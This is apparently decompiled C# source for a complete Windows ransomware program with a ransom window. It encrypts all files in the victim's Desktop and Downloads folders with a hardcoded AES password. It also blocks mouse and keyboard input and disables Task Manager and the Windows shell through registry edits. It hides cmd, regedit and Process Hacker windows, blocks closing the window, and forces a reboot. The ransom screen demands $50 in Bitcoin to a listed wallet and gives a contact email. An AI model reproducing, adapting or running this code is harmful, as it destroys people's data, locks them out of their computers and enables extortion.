using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Rasomware2._0;

public class Ransomware2 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private IContainer components = null;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private Label lbl1;

	private TextBox codebox;

	private Button button11;

	private Label label2;

	private Label label3;

	private Timer tmr_hide;

	private Timer tmr_show;

	private Timer tmr_if;

	private Timer tmr_encrypt;

	private Timer tmr_clock;

	private RichTextBox richTextBox1;

	private GroupBox groupBox1;

	private Label label4;

	private PictureBox pictureBox4;

	private Label label1;

	private RichTextBox richTextBox2;

	private PictureBox pictureBox3;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public Ransomware2()
	{
		InitializeComponent();
		((Control)label2).set_Text(TimeSpan.FromMinutes(60.0).ToString());
	}

	private void Ransomware2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Ransomware2_Load(object sender, EventArgs e)
	{
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		FreezeMouse();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label2).set_Text((TimeSpan.FromMinutes(1440.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_hide.Start();
		tmr_show.Start();
		tmr_if.Start();
		tmr_encrypt.Start();
		tmr_clock.Start();
	}

	private void tmr_hide_Tick(object sender, EventArgs e)
	{
		tmr_hide.Stop();
		((Form)this).set_Opacity(100.0);
		((Form)this).set_Size(new Size(701, 584));
		((Form)this).set_Location(new Point(500, 500));
		Thawouse();
	}

	private void tmr_show_Tick(object sender, EventArgs e)
	{
		tmr_show.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		File.Delete(path2);
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		tmr_if.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
		}
		tmr_if.Start();
	}

	private void tmr_encrypt_Tick(object sender, EventArgs e)
	{
		tmr_encrypt.Stop();
		Start_Encrypt();
	}

	private void tmr_clock_Tick(object sender, EventArgs e)
	{
		tmr_clock.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("Ransomware2.0");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			Process.Start("shutdown", "/r /t 0");
			process.Kill();
		}
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)codebox).get_Text() == "")
		{
			MessageBox.Show("Incorrect key", "WRONG KEY", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)codebox).get_Text() == "@borneosecurity@")
		{
			MessageBox.Show("The key is correct", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			OFF_Encrypt();
			Process[] array = null;
			array = Process.GetProcessesByName("Rasomware2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("WRONG KEY !!! REQUEST PASSWORD EMAIL ME - mrborneo404@gmail.com", "Incorrect key", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void codebox_TextChanged(object sender, EventArgs e)
	{
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "password123";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "password123";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
		}
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click_1(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f4: Expected O, but got Unknown
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Expected O, but got Unknown
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Expected O, but got Unknown
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		//IL_0220: Unknown result type (might be due to invalid IL or missing references)
		//IL_022a: Expected O, but got Unknown
		//IL_02af: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b9: Expected O, but got Unknown
		//IL_0333: Unknown result type (might be due to invalid IL or missing references)
		//IL_033d: Expected O, but got Unknown
		//IL_03dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e7: Expected O, but got Unknown
		//IL_04a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b1: Expected O, but got Unknown
		//IL_0562: Unknown result type (might be due to invalid IL or missing references)
		//IL_056c: Expected O, but got Unknown
		//IL_06e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ee: Expected O, but got Unknown
		//IL_0869: Unknown result type (might be due to invalid IL or missing references)
		//IL_0873: Expected O, but got Unknown
		//IL_08e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f3: Expected O, but got Unknown
		//IL_0970: Unknown result type (might be due to invalid IL or missing references)
		//IL_097a: Expected O, but got Unknown
		//IL_09fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a06: Expected O, but got Unknown
		//IL_0a88: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a92: Expected O, but got Unknown
		//IL_0b33: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b3d: Expected O, but got Unknown
		//IL_0bd6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be0: Expected O, but got Unknown
		//IL_0c21: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c2b: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ransomware2));
		pictureBox1 = new PictureBox();
		pictureBox2 = new PictureBox();
		lbl1 = new Label();
		codebox = new TextBox();
		button11 = new Button();
		label2 = new Label();
		label3 = new Label();
		tmr_hide = new Timer(components);
		tmr_show = new Timer(components);
		tmr_if = new Timer(components);
		tmr_encrypt = new Timer(components);
		tmr_clock = new Timer(components);
		richTextBox1 = new RichTextBox();
		groupBox1 = new GroupBox();
		pictureBox3 = new PictureBox();
		richTextBox2 = new RichTextBox();
		label1 = new Label();
		pictureBox4 = new PictureBox();
		label4 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)groupBox1).SuspendLayout();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox4).BeginInit();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_BackColor(Color.Black);
		((Control)pictureBox1).set_BackgroundImage((Image)componentResourceManager.GetObject("pictureBox1.BackgroundImage"));
		((Control)pictureBox1).set_Cursor(Cursors.get_No());
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(955, 427));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(125, 105));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox2).set_Cursor(Cursors.get_No());
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(523, 138));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(125, 105));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		((Control)lbl1).set_AutoSize(true);
		((Control)lbl1).set_Font(new Font("Arial Narrow", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)lbl1).set_ForeColor(Color.White);
		((Control)lbl1).set_Location(new Point(13, 13));
		((Control)lbl1).set_Name("lbl1");
		((Control)lbl1).set_Size(new Size(0, 25));
		((Control)lbl1).set_TabIndex(2);
		((Control)codebox).set_BackColor(Color.Red);
		((Control)codebox).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)codebox).set_Location(new Point(11, 485));
		((Control)codebox).set_Name("codebox");
		((Control)codebox).set_Size(new Size(670, 31));
		((Control)codebox).set_TabIndex(5);
		codebox.set_TextAlign((HorizontalAlignment)2);
		((Control)codebox).add_TextChanged((EventHandler)codebox_TextChanged);
		((Control)button11).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button11).set_FlatStyle((FlatStyle)1);
		((Control)button11).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)button11).set_ForeColor(Color.White);
		((Control)button11).set_Location(new Point(117, 522));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(485, 31));
		((Control)button11).set_TabIndex(6);
		((Control)button11).set_Text("DECRYPT FILES");
		((ButtonBase)button11).set_UseVisualStyleBackColor(true);
		((Control)button11).add_Click((EventHandler)button1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Cursor(Cursors.get_No());
		((Control)label2).set_Font(new Font("Arial Black", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(272, 23));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(111, 30));
		((Control)label2).set_TabIndex(7);
		((Control)label2).set_Text("00:00:00");
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Cursor(Cursors.get_No());
		((Control)label3).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(6, 16));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(260, 37));
		((Control)label3).set_TabIndex(8);
		((Control)label3).set_Text("REAMING TIME:");
		tmr_hide.set_Enabled(true);
		tmr_hide.set_Interval(10000);
		tmr_hide.add_Tick((EventHandler)tmr_hide_Tick);
		tmr_show.set_Enabled(true);
		tmr_show.set_Interval(1000);
		tmr_show.add_Tick((EventHandler)tmr_show_Tick);
		tmr_if.set_Enabled(true);
		tmr_if.set_Interval(300);
		tmr_if.add_Tick((EventHandler)tmr_if_Tick);
		tmr_encrypt.set_Enabled(true);
		tmr_encrypt.set_Interval(1000);
		tmr_encrypt.add_Tick((EventHandler)tmr_encrypt_Tick);
		tmr_clock.set_Enabled(true);
		tmr_clock.set_Interval(3600000);
		tmr_clock.add_Tick((EventHandler)tmr_clock_Tick);
		((Control)richTextBox1).set_Font(new Font("Microsoft YaHei UI", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox1).set_Location(new Point(15, 317));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(671, 162));
		((Control)richTextBox1).set_TabIndex(10);
		((Control)richTextBox1).set_Text(componentResourceManager.GetString("richTextBox1.Text"));
		((Control)groupBox1).get_Controls().Add((Control)(object)label4);
		((Control)groupBox1).get_Controls().Add((Control)(object)pictureBox4);
		((Control)groupBox1).get_Controls().Add((Control)(object)label1);
		((Control)groupBox1).get_Controls().Add((Control)(object)richTextBox2);
		((Control)groupBox1).get_Controls().Add((Control)(object)pictureBox3);
		((Control)groupBox1).get_Controls().Add((Control)(object)label3);
		((Control)groupBox1).get_Controls().Add((Control)(object)pictureBox2);
		((Control)groupBox1).get_Controls().Add((Control)(object)label2);
		((Control)groupBox1).set_Location(new Point(15, 5));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(670, 306));
		((Control)groupBox1).set_TabIndex(11);
		groupBox1.set_TabStop(false);
		pictureBox3.set_Image((Image)componentResourceManager.GetObject("pictureBox3.Image"));
		((Control)pictureBox3).set_Location(new Point(13, 260));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(211, 30));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox3.set_TabIndex(9);
		pictureBox3.set_TabStop(false);
		((Control)richTextBox2).set_Font(new Font("Microsoft YaHei", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox2).set_Location(new Point(230, 259));
		((Control)richTextBox2).set_Name("richTextBox2");
		((Control)richTextBox2).set_Size(new Size(434, 30));
		((Control)richTextBox2).set_TabIndex(10);
		((Control)richTextBox2).set_Text("1JFNXg14xRgpXNiVfaHbGTG3KkTwYrSvHo");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Mongolian Baiti", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)label1).set_Location(new Point(15, 66));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(494, 161));
		((Control)label1).set_TabIndex(11);
		((Control)label1).set_Text(componentResourceManager.GetString("label1.Text"));
		pictureBox4.set_Image((Image)componentResourceManager.GetObject("pictureBox4.Image"));
		((Control)pictureBox4).set_Location(new Point(515, 16));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(138, 116));
		pictureBox4.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox4.set_TabIndex(12);
		pictureBox4.set_TabStop(false);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Mongolian Baiti", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)label4).set_Location(new Point(230, 243));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(257, 16));
		((Control)label4).set_TabIndex(13);
		((Control)label4).set_Text("SEND $50 PAY WITH BITCOIN");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Form)this).set_ClientSize(new Size(697, 563));
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)button11);
		((Control)this).get_Controls().Add((Control)(object)codebox);
		((Control)this).get_Controls().Add((Control)(object)lbl1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Ransomware2");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("B0rn30L0ck3D");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Ransomware2_FormClosing));
		((Form)this).add_Load((EventHandler)Ransomware2_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox4).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
